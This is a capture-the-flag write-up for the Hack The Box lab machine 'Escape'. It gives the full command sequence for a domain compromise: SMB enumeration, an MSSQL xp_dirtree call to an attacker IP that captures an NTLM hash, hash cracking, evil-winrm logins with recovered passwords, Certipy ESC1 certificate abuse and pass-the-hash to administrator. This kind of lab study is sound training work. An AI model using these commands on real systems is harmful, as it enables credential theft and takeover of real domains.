#box #impacket-mssqlclient #responder #log-exfiltration #certipy 
Escape is an interesting machine involving a NTLM Relay Attack through MSSQL `xp_dirtree`. Once obtained the first NTLMv2 Hash for the user `sql_svc` it's possible to connect remotely on the machine since that user belong to the group Remote Management Users. Once on the target machine a file in `C:\SQLServer\Logs\ERRORLOG.BAK` display a password in clear text due to a mistyping of an user. We can then move laterally on the user `Ryan.Cooper`. Once on that user we discover through `certipy-ad` a vulnerability caused by a certificate misconfiguration `Certipy - ESC1`. With this vulnerability we're able to request the administrator's certificate with our user and then request the administrator hash. Finally we can authenticate with a PtH and obtain the DC administrator.

## Nmap

```bash
# Nmap 7.95 scan initiated Tue Sep 23 11:42:16 2025 as: /usr/lib/nmap/nmap -sCV --min-rate=10000 -o nmap_sCV 10.10.11.202
Nmap scan report for 10.10.11.202
Host is up (0.042s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-23 23:42:23Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-09-23T23:43:43+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2025-09-23T23:43:44+00:00; +8h00m00s from scanner time.
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-09-23T23:41:47
|_Not valid after:  2055-09-23T23:41:47
| ms-sql-info: 
|   10.10.11.202:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2025-09-23T23:43:43+00:00; +8h00m00s from scanner time.
| ms-sql-ntlm-info: 
|   10.10.11.202:1433: 
|     Target_Name: sequel
|     NetBIOS_Domain_Name: sequel
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: dc.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-09-23T23:43:43+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2025-09-23T23:43:44+00:00; +8h00m00s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m59s
| smb2-time: 
|   date: 2025-09-23T23:43:05
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Sep 23 11:43:44 2025 -- 1 IP address (1 host up) scanned in 87.83 seconds
```

## 445 - SMB

We discover the possibility to authenticate with the null user onto the `Public` folder of SMB:

```bash
smbclient -N //sequel.htb/Public
```

Inside that folder we discover the presence of a file called `SQL Server Procedures.pdf`. We download it and, inside of it we extrapolated the following:


```text
# SQL Server Procedures

Since last year we've got quite few accidents with our SQL Servers (looking at you Ryan, with your instance on the DC, why should
you even put a mock instance on the DC?!). So Tom decided it was a good idea to write a basic procedure on how to access and
then test any changes to the database. Of course none of this will be done on the live server, we cloned the DC mockup to a
dedicated server.
Tom will remove the instance from the DC as soon as he comes back from his vacation.
The second reason behind this document is to work like a guide when no senior can be available for all juniors.

# Accessing from Domain Joined machine

1. Use SQL Management Studio specifying "Windows" authentication which you can donwload here:
https://learn.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms?view=sql-server-ver16
2. In the "Server Name" field, input the server name.
3. Specify "Windows Authentication" and you should be good to go.
4. Access the database and make that you need. Everything will be resynced with the Live server overnight.
   
# Accessing from non domain joined machine

Accessing from non domain joined machines can be a little harder.
The procedure is the same as the domain joined machine but you need to spawn a command prompt and run the following
command: 
cmdkey /add:"<serverName>.sequel.htb" /user:"sequel\<userame>" /pass:<password>.
Follow the other steps from above procedure.
If any problem arises, please send a mail to BrandonBonus For new hired and those that are still waiting their users to be created and perms assigned, can sneak a peek at the Database with
user PublicUser and password GuestUserCantWrite1 .
Refer to the previous guidelines and make sure to switch the "Windows Authentication" to "SQL Server Authentication".
```
## SQL

With the content discovered in the pdf file, we proceed to authenticate into SQL with the user `PublicUser:GuestUserCantWrite1`.

```bash
impacket-mssqlclient PublicUser@sequel.htb
```

Inside the database we do not discover any sensitive data, however we notice that apparently we can use `xp_dirtree`. The `impacket` version of it didn't seem to work, however a quick search online finds us a command that seems to returning us a NetNTLM hash Relay attack. We start our responder session with `responder -I tun0` and we then execute the following command:

```sql
exec master.dbo.xp_dirtree '\\<attacker_IP>\any\thing'
```

Obtaining the hash of the user `sql_svc`.

![[attachments/escape-writeup-1.png]]

We proceed to crack it with hashcat:

```bash
hashcat -m 5600 ntlmv2_sql_svc_hash.txt /usr/share/wordlists/rockyou.txt
```

Obtaining a new pair of credentials: `sql_svc:REGGIE1234ronnie`

## 5985 - Evil-WinRM

We proceed to authenticate with the brand new user with Evil-WinRM discover, at our surprise, that the `sql_svc` (being a service user) is apparently belonging to the Remote Management Users group.

```bash
evil-winrm -u sql_svc -p 'REGGIE1234ronnie' -i sequel.htb
```
### ERRORLOG.BAK

Inside the machine, we discover the presence of a file called `ERRORLOG.BAK`, precisely in the folder `C:\SQLServer\Logs\`. We proceed to reading it, discovering that the user `Ryan.Cooper` has, by mistake, prompted the password which has been then returned in cleartext inside the file:

![[attachments/escape-writeup-2.png]]

We then recovered a new pair of credentials: `Ryan.Coooper:NuclearMosquito3`

## Certipy-ad Certificate Misconfiguration

We authenticate again onto the machine with the new set of credentials:

```bash
evil-winrm -u Ryan.Cooper -p 'NuclearMosquito3' -i sequel.htb
```

and after some research we discover a vulnerability caused by a misconfiguration of the certificate for that user.
To discover that vulnerability, we've used the following `certipy-ad` command:

```bash
certipy-ad find -u 'Ryan.Cooper' -p 'NuclearMosquito3' -dc-ip 10.10.11.202 -vulnerable -enabled
```

Discovering:

![[attachments/escape-writeup-3.png]]

Two more information required for the privilege escalation are
* CA Name
  ![[attachments/escape-writeup-4.png]]
* Template Name
  ![[attachments/escape-writeup-5.png]]

The misconfiguration is explained [here](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc1-enrollee-supplied-subject-for-client-authentication).

Following the guide, we first recover the necessary information with:

```bash
certipy-ad account -u 'Ryan.Cooper' -p 'NuclearMosquito3' -dc-ip 10.10.11.202 -user 'administrator' read
```

With this we'll require the SID: 
![[attachments/escape-writeup-6.png]]

Finally, we request the administrator's certificate with:

```bash
certipy-ad req -u 'Ryan.Cooper' -p 'NuclearMosquito3' -dc-ip 10.10.11.202 -target 'sequel.htb' -ca 'sequel-DC-CA' -template 'UserAuthentication' -upn 'administrator@sequel.htb' -sid 'S-1-5-21-4078382237-1492182817-2568127209-500'
```

Obtaining the `administrator.pfx` certificate file.
With this certificate file we can finally recover the administrator's hash: 

```bash
certipy-ad auth -pfx 'administrator.pfx' -dc-ip 10.10.11.202
```

![[attachments/escape-writeup-7.png]]

Finally, we can now authenticate with `evil-winrm` obtaining the DC's administrator:

```bash
evil-winrm -u administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee -i sequel.htb
```